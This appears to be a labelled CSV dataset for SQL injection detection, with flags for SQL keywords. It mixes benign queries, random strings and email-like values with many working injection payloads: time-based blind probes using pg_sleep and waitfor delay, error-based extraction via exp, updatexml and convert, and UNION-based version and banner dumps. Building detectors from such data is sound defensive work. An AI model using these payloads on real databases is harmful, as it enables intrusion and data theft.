Query,SELECT,UNION,OR,AND,Label
select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,1,0,0,0,1
rupp@djbroadcast.gov,0,0,0,0,0
pelamen,0,0,0,0,0
1   )    )    as jvoo where 5116  =  5116 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
SELECT * FROM entirely WHERE prevent LIKE '%main%',1,0,0,0,0
"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,0,1,1
"1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1,0,0,1,1
2.77156E+15,0,0,0,0,0
9mbaicin,0,0,0,0,0
" SELECT * FROM judge ORDER BY means, flow",1,0,1,0,0
SELECT * FROM when WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
pangborne@europop.mw,0,0,1,0,0
SELECT AVG ( Price ) FROM chief,1,0,0,0,0
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1,1,0,1
graupere trabucco,0,0,0,0,0
5856,0,0,0,0,0
0esino1o,0,0,0,0,0
5788,0,0,0,0,0
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,0,1,0,1
benzo,0,0,0,0,0
-4835   )    )     )   or   (  4219  =  2081  )  *2081 and    (    (     (  8536  =  8536,0,0,1,1,1
waitfor delay '0:0:5' and    (    (     (  '%'  =  ',0,0,1,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0,0,1,1
"-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",1,0,1,1,1
SELECT AVG ( pen ) FROM sand SELECT SUM ( maybe ) ,1,0,0,1,0
nadilla,0,0,0,0,0
9834,0,0,0,0,0
varley@tecnoindomo.ki,0,0,0,0,0
48c09a,0,0,0,0,0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""sfbc""  =  ""sfbc",1,0,0,1,1
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,1,0,0,1
"-3475"" or elt  (  5532  =  4242,4242  )  ",0,0,1,0,1
"-4705' where 2029  =  2029 union all select 2029,2029,2029#",1,1,0,0,1
loudiadi,0,0,0,0,0
jiinshuh,0,0,0,0,0
SELECT importance ( s ) FROM carried INNER JOIN,1,0,1,0,0
griffy,0,0,0,0,0
"  SELECT weather AS sold, construction AS [sit]  FROM bar",1,0,0,0,0
-4023 or   (  8779  =  5716  )  *5716,0,0,1,0,1
1   )    )    as eigk where 2557  =  2557,0,0,0,0,1
SELECT gave ( s )  FROM sum SELECT meant ( s ) ,1,0,0,0,0
daochuan,0,0,0,0,0
"1  )   union all select null,null,null,null,null,null#",1,1,0,0,1
SELECT * FROM slide WHERE hall  BETWEEN 10 AND 20,1,0,0,1,0
"1  )   as oblq where 2002  =  2002 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,0,1,0,1
"  SELECT * FROM layers WHERE mostly NOT IN  ( 'roof', 'rain', 'soon' )  ",1,0,0,0,0
1 where 7254  =  7254,0,0,0,0,1
SELECT * FROM pan,1,0,0,0,0
SELECT * FROM liquid WHERE sick NOT BETWEEN 'easy' AND 'next',1,0,0,1,0
SELECT so ( s )  FROM blue LEFT JOIN,1,0,0,0,0
DELETE FROM everything WHERE when = 'eventually',0,0,0,0,0
"   SELECT COUNT ( religious ) , team FROM go BY canal",1,0,0,0,0
5.84996E+15,0,0,0,0,0
1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,0,1,1
novelador,0,0,1,0,0
SELECT MIN ( wood )  AS union FROM disease,1,1,0,0,0
"-5672%"" or 3825  =  9675--",0,0,1,0,1
SELECT * FROM six WHERE needs = 'pleasant'  AND City = 'breathe',1,0,0,1,0
